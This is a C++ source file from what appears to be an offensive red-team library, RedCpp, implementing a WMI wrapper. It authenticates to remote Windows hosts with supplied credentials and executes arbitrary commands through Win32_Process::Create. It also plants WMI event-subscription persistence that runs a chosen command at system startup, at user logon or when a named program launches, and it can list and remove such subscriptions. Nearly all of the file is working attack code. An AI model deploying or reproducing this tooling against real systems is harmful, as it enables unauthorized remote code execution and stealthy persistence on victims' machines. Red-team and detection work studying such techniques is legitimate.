/*
* Author: Hegusung
* Github: https://github.com/hegusung/RedCpp
*/

#include "wmi.h"

WMI::WMI()
{
	//this->initializeCom();
	IWbemLocator* wbemLocator = NULL;
	IWbemServices* wbemServices = NULL;
	authenticated = false;
	std::wstring wmi_namespace = L"";
}

WMI::~WMI()
{
}

bool WMI::authenticate(const wchar_t* wmi_namespace, const char* host, const char* username, const char* password)
{
	this->authenticated = this->setUpWBEM(wmi_namespace, host, username, password, &this->wbemLocator, &this->wbemServices);
	if (this->authenticated)
	{
		this->wmi_namespace = std::wstring(wmi_namespace);
	}

	return this->authenticated;
}

bool WMI::authenticate_cimv2(const char* host, const char* username, const char* password)
{
	return this->authenticate(L"ROOT\\CIMV2", host, username, password);
}

bool WMI::authenticate_subscription(const char* host, const char* username, const char* password)
{
	return this->authenticate(L"ROOT\\SUBSCRIPTION", host, username, password);
}

void WMI::deauthenticate()
{
	this->authenticated = false;
	this->wmi_namespace = L"";

	if (wbemServices != NULL)
		wbemServices->Release();
	wbemServices = NULL;

	if (wbemLocator != NULL)
		wbemLocator->Release();
	wbemLocator = NULL;
}

/*
* Authenticate to ROOT\\CIMV2 first
*/
bool WMI::execute(const char* command)
{
	if (!this->authenticated || this->wmi_namespace.compare(L"ROOT\\CIMV2") != 0)
		return false;

	// Step 7: --------------------------------------------------
// Use the IWbemServices pointer to make requests of WMI ----

// set up to call the Win32_Process::Create method
	BSTR MethodName = SysAllocString(L"Create");
	BSTR ClassName = SysAllocString(L"Win32_Process");

	IWbemClassObject* pClass = NULL;
	HRESULT hres = wbemServices->GetObject(ClassName, 0, NULL, &pClass, NULL);
	if (FAILED(hres))
	{
#ifdef DEBUG
		printf("Failed to get object Win32_Process: %d\n", hres);
#endif

		SysFreeString(ClassName);
		SysFreeString(MethodName);

		return false;               // Program has failed.
	}

	IWbemClassObject* pInParamsDefinition = NULL;
	hres = pClass->GetMethod(MethodName, 0,
		&pInParamsDefinition, NULL);
	if (FAILED(hres))
	{
#ifdef DEBUG
		printf("Failed to get object Create: %d\n", hres);
#endif

		SysFreeString(ClassName);
		SysFreeString(MethodName);
		
		return false;               // Program has failed.
	}

	IWbemClassObject* pClassInstance = NULL;
	hres = pInParamsDefinition->SpawnInstance(0, &pClassInstance);

	// Exec part
	wchar_t* cmd = (wchar_t*)malloc(sizeof(wchar_t) * (strlen(command) + 1));
	MultiByteToWideChar(CP_ACP, 0, command, -1, cmd, sizeof(wchar_t) * (strlen(command)));

	// Create the values for the in parameters
	VARIANT varCommand;
	varCommand.vt = VT_BSTR;
	varCommand.bstrVal = _bstr_t(cmd);

	// Store the value for the in parameters
	hres = pClassInstance->Put(L"CommandLine", 0, &varCommand, 0);

	// Execute Method
	IWbemClassObject* pOutParams = NULL;
	hres = wbemServices->ExecMethod(ClassName, MethodName, 0, NULL, pClassInstance, &pOutParams, NULL);

	if (FAILED(hres))
	{
#ifdef DEBUG
		printf("Could not execute method: %d\n", GetLastError());
#endif

		VariantClear(&varCommand);
		SysFreeString(ClassName);
		SysFreeString(MethodName);
		pClass->Release();
		pClassInstance->Release();
		pInParamsDefinition->Release();
		pOutParams->Release();

		return false;               // Program has failed.
	}

	// Clean up
	//--------------------------
	VariantClear(&varCommand);
	//VariantClear(&varReturnValue);
	SysFreeString(ClassName);
	SysFreeString(MethodName);
	pClass->Release();
	pClassInstance->Release();
	pInParamsDefinition->Release();
	pOutParams->Release();

#ifdef DEBUG
	printf("Successfully executed command through WMI\n");
#endif

	return true;
}

bool WMI::initializeCom() {
	// Step 1: --------------------------------------------------
	// Initialize COM. ------------------------------------------

	HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED);
	if (FAILED(hres))
	{
		std::cout << "Failed to initialize COM library. Error code = 0x"
			<< std::hex << hres << std::endl;
		return false;                  // Program has failed.
	}

	// Step 2: --------------------------------------------------
	// Set general COM security levels --------------------------

	hres = CoInitializeSecurity(
		nullptr,
		-1,                          // COM authentication
		nullptr,                        // Authentication services
		nullptr,                        // Reserved
		RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
		RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation  
		nullptr,                        // Authentication info
		EOAC_NONE,                   // Additional capabilities 
		nullptr                         // Reserved
	);

	if (FAILED(hres))
	{
		std::cout << "Failed to initialize security. Error code = 0x"
			<< std::hex << hres << std::endl;
		CoUninitialize();
		return false;                    // Program has failed.
	}
	return true;
}

bool WMI::setUpWBEM(const wchar_t* wmi_namespace, const char* host, const char* username, const char* password, IWbemLocator** wbemLocator, IWbemServices** wbemServices) {

	HRESULT hres;
	bool success = com.CreateInstance(CLSID_WbemLocator, IID_IWbemLocator, (LPVOID*)wbemLocator, NULL, NULL, NULL, NULL);
	if (!success)
	{
		return false;
	}

	// Step 4: -----------------------------------------------------
	// Connect to WMI through the IWbemLocator::ConnectServer method

	// Connect to the root\cimv2 namespace with
	// the current user and obtain pointer wbemServices
	// to make IWbemServices calls.

	wchar_t w_username[MAX_PATH];
	wchar_t w_password[MAX_PATH];
	wchar_t w_host[MAX_PATH];
	wchar_t w_namespace[MAX_PATH];

	if (host == NULL)
	{
		hres = (*wbemLocator)->ConnectServer(
			_bstr_t(wmi_namespace), // Object path of WMI namespace  L"ROOT\\CIMV2"
			nullptr,                    // User name. NULL = current user
			nullptr,                    // User password. NULL = current
			0,                       // Locale. NULL indicates current
			0,                    // Security flags.
			0,                       // Authority (for example, Kerberos)
			0,                       // Context object 
			wbemServices            // pointer to IWbemServices proxy
		);
	}
	else
	{
		MultiByteToWideChar(CP_ACP, 0, host, -1, w_host, MAX_PATH);
		swprintf_s(w_namespace, MAX_PATH, L"\\\\%s\\%s", w_host, wmi_namespace);

		if (username != NULL)
		{
			MultiByteToWideChar(CP_ACP, 0, username, -1, w_username, MAX_PATH);
			MultiByteToWideChar(CP_ACP, 0, password, -1, w_password, MAX_PATH);

			// Connect to the local root\cimv2 namespace
			// and obtain pointer pSvc to make IWbemServices calls.
			hres = (*wbemLocator)->ConnectServer(
				_bstr_t(w_namespace),
				_bstr_t(w_username),
				_bstr_t(w_password),
				0,
				NULL,
				0,
				0,
				wbemServices
			);

		}
		else
		{
			// Connect to the local root\cimv2 namespace
			// and obtain pointer pSvc to make IWbemServices calls.
			hres = (*wbemLocator)->ConnectServer(
				_bstr_t(w_namespace),
				NULL,
				NULL,
				0,
				NULL,
				0,
				0,
				wbemServices
			);
		}
	}

	if (FAILED(hres))
	{
		std::cout << "Could not connect. Error code = 0x" << std::hex << hres << std::endl;
		(*wbemLocator)->Release();
		(*wbemLocator) = NULL;
		CoUninitialize();
		return false;                // Program has failed.
	}

	//std::cout << "Connected to ROOT\\CIMV2 WMI namespace" << std::endl;

	// Step 5: --------------------------------------------------
	// Set security levels on the proxy -------------------------

	if (host == NULL)
	{
		hres = CoSetProxyBlanket(
			*wbemServices,                // Indicates the proxy to set
			RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx
			RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx
			nullptr,                        // Server principal name 
			RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 
			RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
			nullptr,                        // client identity
			EOAC_NONE                    // proxy capabilities 
		);
	}
	else
	{
		COAUTHIDENTITY* userAcct = NULL;

		if (username != NULL)
		{
			userAcct = (COAUTHIDENTITY*)malloc(sizeof(COAUTHIDENTITY));
			memset(userAcct, 0, sizeof(COAUTHIDENTITY));
			userAcct->PasswordLength = wcslen(w_password);
			userAcct->Password = (USHORT*)w_password;

			wchar_t w_domain[200];
			wchar_t w_usr[200];
			wchar_t* slash = wcschr(w_username, L'\\');
			if (slash == NULL)
			{
				wcscpy_s(w_usr, 200, w_username);
				wcscpy_s(w_domain, 200, L"WORKGROUP");
			}
			else
			{
				wcscpy_s(w_usr, 200, slash + 1);
				wcsncpy_s(w_domain, 200, w_username, slash - w_username);
			}

			userAcct->User = (USHORT*)w_usr;
			userAcct->UserLength = wcslen(w_usr);

			userAcct->Domain = (USHORT*)w_domain;
			userAcct->DomainLength = wcslen(w_domain);
			userAcct->Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;

		}

		hres = CoSetProxyBlanket(
			*wbemServices,                           // Indicates the proxy to set
			RPC_C_AUTHN_DEFAULT,            // RPC_C_AUTHN_xxx
			RPC_C_AUTHZ_DEFAULT,            // RPC_C_AUTHZ_xxx
			COLE_DEFAULT_PRINCIPAL,         // Server principal name 
			RPC_C_AUTHN_LEVEL_PKT_PRIVACY,  // RPC_C_AUTHN_LEVEL_xxx 
			RPC_C_IMP_LEVEL_IMPERSONATE,    // RPC_C_IMP_LEVEL_xxx
			userAcct,                       // client identity
			EOAC_NONE                       // proxy capabilities 
		);
	}

	if (FAILED(hres))
	{
		std::cout << "Could not set proxy blanket. Error code = 0x"
			<< std::hex << hres << std::endl;
		(*wbemServices)->Release();
		(*wbemServices) = NULL;
		(*wbemLocator)->Release();
		(*wbemLocator) = NULL;
		CoUninitialize();
		return false;               // Program has failed.
	}

	return true;
}

/*
* Authenticate to ROOT\\SUBSCRIPTION first
*/
bool WMI::persistence(const wchar_t* ef_class_name, const wchar_t* ec_class_name, const wchar_t* command, const wchar_t* query)
{
	// Source: https://github.com/wumb0/sh3llparty/blob/master/wmicallback.cpp

	bool success = false;

	if (!this->authenticated || this->wmi_namespace.compare(L"ROOT\\SUBSCRIPTION") != 0)
		return false;

	HRESULT hres;
	BSTR ClassName;
	IWbemClassObject* ef = NULL, * ec = NULL, * e2c = NULL, * ti = NULL;
	IWbemClassObject* eventConsumer = NULL, * eventFilter = NULL, * f2cBinding = NULL, * timerinstruction = NULL;

	std::wstring str1, str2;

	ClassName = SysAllocString(L"CommandLineEventConsumer");
	hres = wbemServices->GetObject(ClassName, 0, NULL, &eventConsumer, NULL);
	SysFreeString(ClassName);
	if (FAILED(hres))
	{
#ifdef DEBUG
		printf("Failed to get object CommandLineEventConsumer: %x\n", hres);
#endif
		goto rip;
	}

	ClassName = SysAllocString(L"__EventFilter");
	hres = wbemServices->GetObject(ClassName, 0, NULL, &eventFilter, NULL);
	SysFreeString(ClassName);
	if (FAILED(hres))
	{
#ifdef DEBUG
		printf("Failed to get object __EventFilter: %d\n", hres);
#endif

		goto rip;
	}

	ClassName = SysAllocString(L"__FilterToConsumerBinding");
	hres = wbemServices->GetObject(ClassName, 0, NULL, &f2cBinding, NULL);
	SysFreeString(ClassName);
	if (FAILED(hres))
	{
#ifdef DEBUG
		printf("Failed to get object __FilterToConsumerBinding: %d\n", hres);
#endif

		goto rip;
	}

	ClassName = SysAllocString(L"__IntervalTimerInstruction");
	hres = wbemServices->GetObject(ClassName, 0, NULL, &timerinstruction, NULL);
	SysFreeString(ClassName);
	if (FAILED(hres))
	{
#ifdef DEBUG
		printf("Failed to get object __IntervalTimerInstruction: %d\n", hres);
#endif

		goto rip;
	}

	//spawn __EventFilter class instance
	hres = eventFilter->SpawnInstance(0, &ef);
	if (FAILED(hres)) {
#ifdef DEBUG
		printf("Failed to get spawn __EventFilter: %d\n", hres);
#endif
		goto rip;
	}

	// Set parameters
	VARIANT var;
	var.vt = VT_BSTR;

	// Set Name
	var.bstrVal = _bstr_t(ef_class_name);
	hres = ef->Put(L"Name", 0, &var, CIM_STRING);

	// Set QueryLanguage
	var.bstrVal = _bstr_t(L"WQL");
	hres = ef->Put(L"QueryLanguage", 0, &var, CIM_STRING);

	// Set Query
	var.bstrVal = _bstr_t(query);
	//var.bstrVal = _bstr_t(L"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Caption = \"chrome.exe\"");
	hres = ef->Put(L"Query", 0, &var, CIM_STRING);

	hres = wbemServices->PutInstance(ef, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
	if (FAILED(hres)) {
#ifdef DEBUG
		printf("Failed to put instance __EventFilter: %d\n", hres);
#endif
		goto rip;
	}


	//spawn CommandLineEventConsumer  class instance
	hres = eventConsumer->SpawnInstance(0, &ec);
	if (FAILED(hres)) {
#ifdef DEBUG
		printf("Failed to get spawn CommandLineEventConsumer : %d\n", hres);
#endif
		goto rip;
	}

	// Set Name
	var.bstrVal = _bstr_t(ec_class_name);
	hres = ec->Put(L"Name", 0, &var, CIM_STRING);

	// Set CommandLineTemplate
	var.bstrVal = _bstr_t(command);
	hres = ec->Put(L"CommandLineTemplate", 0, &var, CIM_STRING);

	hres = wbemServices->PutInstance(ec, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
	if (FAILED(hres)) {
#ifdef DEBUG
		printf("Failed to put instance CommandLineEventConsumer: %d\n", hres);
#endif
		goto rip;
	}


	//spawn __FilterToConsumerBinding   class instance
	hres = f2cBinding->SpawnInstance(0, &e2c);
	if (FAILED(hres)) {
#ifdef DEBUG
		printf("Failed to get spawn __FilterToConsumerBinding : %d\n", hres);
#endif
		goto rip;
	}

	// Set Name
	str1 = L"CommandLineEventConsumer.Name=\"" + std::wstring(ec_class_name) + L"\"";
	var.bstrVal = _bstr_t(str1.c_str());
	hres = e2c->Put(L"Consumer", 0, &var, CIM_REFERENCE);

	// Set CommandLineTemplate
	str2 = L"__EventFilter.Name=\"" + std::wstring(ef_class_name) + L"\"";
	var.bstrVal = _bstr_t(str2.c_str());
	hres = e2c->Put(L"Filter", 0, &var, CIM_REFERENCE);

	hres = wbemServices->PutInstance(e2c, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
	if (FAILED(hres)) {
#ifdef DEBUG
		printf("Failed to put instance CommandLineEventConsumer: %d\n", hres);
#endif
		goto rip;
	}


	// Add __IntervalTimerInstruction if required 

	success = true;

rip:
	if (ti)
		ti->Release();
	if (e2c)
		e2c->Release();
	if (ef)
		ef->Release();
	if (ec)
		ec->Release();
	ti = ec = ef = e2c = NULL;
	if (eventConsumer)
		eventConsumer->Release();
	if (eventFilter)
		eventFilter->Release();
	if (f2cBinding)
		f2cBinding->Release();
	if (timerinstruction)
		timerinstruction->Release();

	return success;
}

/*
* Authenticate to ROOT\\SUBSCRIPTION first
*/
bool WMI::persistence_startup(const wchar_t* ef_class_name, const wchar_t* ec_class_name, const wchar_t* command)
{
	return this->persistence(ef_class_name, ec_class_name, command, L"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325");
}

/*
* Authenticate to ROOT\\SUBSCRIPTION first
*/
bool WMI::persistence_userlogon(const wchar_t* ef_class_name, const wchar_t* ec_class_name, const wchar_t* command)
{
	return this->persistence(ef_class_name, ec_class_name, command, L"SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'");
}

/*
* Authenticate to ROOT\\SUBSCRIPTION first
*/
bool WMI::persistence_onexecution(const wchar_t* ef_class_name, const wchar_t* ec_class_name, const wchar_t* command, const wchar_t* binary)
{
	std::wstring query = L"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Caption = \"" + std::wstring(binary) + L"\"";
	return this->persistence(ef_class_name, ec_class_name, command, query.c_str());
}


/*
* Authenticate to ROOT\\SUBSCRIPTION first
*/
std::list<Object>* WMI::list_event_filters()
{
	return this->list_class_objects(L"__EventFilter");
}

/*
* Authenticate to ROOT\\SUBSCRIPTION first
*/
std::list<Object>* WMI::list_event_consumers()
{
	return this->list_class_objects(L"__EventConsumer");
}

/*
* Authenticate to ROOT\\SUBSCRIPTION first
*/
std::list<Object>* WMI::list_event_filter_to_consumers()
{
	return this->list_class_objects(L"__FilterToConsumerBinding");
}

/*
* Authenticate to ROOT\\SUBSCRIPTION first
*/
std::list<Object>* WMI::list_class_objects(const wchar_t* class_name)
{
	std::list<Object>* object_list = NULL;

	if (!this->authenticated || this->wmi_namespace.compare(L"ROOT\\SUBSCRIPTION") != 0)
		return NULL;

	HRESULT hres;
	BSTR ClassName;
	IEnumWbemClassObject* enumClassObject = NULL;
	ULONG nb_objects;
	IWbemClassObject* eventConsumer[10];

	ClassName = SysAllocString(class_name);
	hres = wbemServices->CreateInstanceEnum(ClassName, WBEM_FLAG_FORWARD_ONLY, NULL, &enumClassObject);
	SysFreeString(ClassName);
	if (FAILED(hres))
	{
#ifdef DEBUG
		wprintf(L"Failed to enum %s: %x\n", class_name, hres);
#endif
		goto rip;
	}

	object_list = new std::list<Object>();

	while (enumClassObject->Next(0, 10, eventConsumer, &nb_objects) != WBEM_S_NO_MORE_DATA)
	{
		if (nb_objects == 0)
			break;

		for (ULONG n = 0; n < nb_objects; n++)
		{
			Object object;

			eventConsumer[n]->BeginEnumeration(NULL);

			BSTR bName; // used to get name of attribute
			VARIANT val; // WMI attribute
			CIMTYPE type; // WMI attribute type

			while (eventConsumer[n]->Next(0, &bName, &val, &type, NULL) != WBEM_S_NO_MORE_DATA)
			{
				if (val.vt == VT_NULL) // VT_NULL
				{
					object.add(Entry((wchar_t*)bName, L"VT_NULL", L"(null)"));
				}
				else if (val.vt == VT_I2) // VT_I2
				{
					object.add(Entry((wchar_t*)bName, L"VT_I2", std::to_wstring(val.intVal)));
				}
				else if (val.vt == VT_I4) // VT_I4
				{
					object.add(Entry((wchar_t*)bName, L"VT_I4", std::to_wstring(val.intVal)));
				}
				else if (val.vt == VT_BOOL) // VT_BOOL 
				{
					object.add(Entry((wchar_t*)bName, L"VT_BOOL", std::to_wstring(val.intVal)));
				}
				else if (val.vt == VT_UI4) // VT_UI4 
				{
					object.add(Entry((wchar_t*)bName, L"VT_UI4", std::to_wstring(val.uintVal)));
				}
				else if (val.vt == VT_BSTR) // VT_BSTR  
				{
					object.add(Entry((wchar_t*)bName, L"VT_BSTR", (wchar_t*)val.bstrVal));
				}
				else
				{
					object.add(Entry((wchar_t*)bName, std::to_wstring(val.vt).c_str(), L"Unknown"));
				}

				VariantClear(&val);
				SysFreeString(bName);
			}

			eventConsumer[n]->EndEnumeration();

			eventConsumer[n]->Release();

			object_list->push_back(object);
		}
	}

rip:

	return object_list;
}

/*
* Authenticate to a namespace first first
*/
std::list<Object>* WMI::wql_query(const wchar_t* query)
{
	std::list<Object>* object_list = NULL;

	if (!this->authenticated)
		return NULL;

	HRESULT hres;
	BSTR bstr_wql = SysAllocString(L"WQL");
	BSTR bstr_sql = SysAllocString(query);

	IEnumWbemClassObject* pEnumerator{ nullptr };
	hres = this->wbemServices->ExecQuery(
		bstr_wql,
		bstr_sql,
		WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
		nullptr,
		&pEnumerator);

	if (FAILED(hres))
	{
		return NULL;               // Program has failed.
	}

	object_list = new std::list<Object>();

	IWbemClassObject* pclsObj{ nullptr };
	ULONG uReturn = 0;

	while (true)
	{
		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);

		if (0 == uReturn)
		{
			break;
		}

		Object object;
		pclsObj->BeginEnumeration(NULL);

		BSTR bName; // used to get name of attribute
		VARIANT val; // WMI attribute
		CIMTYPE type; // WMI attribute type

		while (pclsObj->Next(0, &bName, &val, &type, NULL) != WBEM_S_NO_MORE_DATA)
		{
			if (val.vt == VT_NULL) // VT_NULL
			{
				object.add(Entry((wchar_t*)bName, L"VT_NULL", L"(null)"));
			}
			else if (val.vt == VT_I2) // VT_I2
			{
				object.add(Entry((wchar_t*)bName, L"VT_I2", std::to_wstring(val.intVal)));
			}
			else if (val.vt == VT_I4) // VT_I4
			{
				object.add(Entry((wchar_t*)bName, L"VT_I4", std::to_wstring(val.intVal)));
			}
			else if (val.vt == VT_BOOL) // VT_BOOL 
			{
				object.add(Entry((wchar_t*)bName, L"VT_BOOL", std::to_wstring(val.intVal)));
			}
			else if (val.vt == VT_UI4) // VT_UI4 
			{
				object.add(Entry((wchar_t*)bName, L"VT_UI4", std::to_wstring(val.uintVal)));
			}
			else if (val.vt == VT_BSTR) // VT_BSTR  
			{
				object.add(Entry((wchar_t*)bName, L"VT_BSTR", (wchar_t*)val.bstrVal));
			}
			else
			{
				object.add(Entry((wchar_t*)bName, std::to_wstring(val.vt).c_str(), L"Unknown"));
			}

			VariantClear(&val);
			SysFreeString(bName);
		}

		pclsObj->EndEnumeration();

		pclsObj->Release();

		object_list->push_back(object);

		
	}

rip:
	return object_list;
}

/*
* Authenticate to ROOT\\SUBSCRIPTION first
*/
bool WMI::delete_object(const wchar_t* class_name, const wchar_t* instance_name)
{
	if (!this->authenticated || this->wmi_namespace.compare(L"ROOT\\SUBSCRIPTION") != 0)
		return false;

	std::wstring query = std::wstring(class_name) + L".Name=\"" + instance_name + L"\"";

	HRESULT hres;
	BSTR objPath = SysAllocString(query.c_str());

	hres = wbemServices->DeleteInstance(
		objPath,
		0L, NULL, NULL);
	SysFreeString(objPath);

	if (hres == ERROR_SUCCESS)
	{
		return true;
	}
	else
	{
#ifdef DEBUG
		printf("Failed deleting object: %x\n", hres);
#endif
		return false;
	}
}

/*
* Authenticate to ROOT\\SUBSCRIPTION first
*/
bool WMI::delete_persistence(const wchar_t* ef_class_name, const wchar_t* ec_class_name)
{
	if (!this->authenticated || this->wmi_namespace.compare(L"ROOT\\SUBSCRIPTION") != 0)
		return false;

	bool failed = false;
	HRESULT hres;

	std::wstring query = std::wstring(L"__EventFilter.Name=\"") + ef_class_name + L"\"";
	BSTR objPath = SysAllocString(query.c_str());

	hres = wbemServices->DeleteInstance(
		objPath,
		0L, NULL, NULL);
	SysFreeString(objPath);

	if (hres != ERROR_SUCCESS)
	{
#ifdef DEBUG
		printf("Failed deleting event filter: %x\n", hres);
#endif
		failed = true;
	}

	query = std::wstring(L"CommandLineEventConsumer.Name=\"") + ec_class_name + L"\"";
	objPath = SysAllocString(query.c_str());

	hres = wbemServices->DeleteInstance(
		objPath,
		0L, NULL, NULL);
	SysFreeString(objPath);

	if (hres != ERROR_SUCCESS)
	{
#ifdef DEBUG
		printf("Failed deleting event consumer: %x\n", hres);
#endif
		failed = true;
	}

	query = std::wstring(L"__FilterToConsumerBinding.Consumer=\"CommandLineEventConsumer.Name=\\\"") + ec_class_name + L"\\\"\",Filter=\"__EventFilter.Name=\\\"" + ef_class_name + L"\\\"\"";
	objPath = SysAllocString(query.c_str());

	wprintf(L"%s\n", query.c_str());

	hres = wbemServices->DeleteInstance(
		objPath,
		0L, NULL, NULL);
	SysFreeString(objPath);

	if (hres != ERROR_SUCCESS)
	{
#ifdef DEBUG
		printf("Failed deleting filter 2 consumer: %x\n", hres);
#endif
		failed = true;
	}

	return !failed;
}


Entry::Entry(const wchar_t* name, const wchar_t* type, std::wstring value)
{
	this->name = std::wstring(name);
	this->type = std::wstring(type);
	this->value = value;
}

Object::Object()
{
}

void Object::add(Entry entry)
{
	this->entry_list.push_back(entry);
}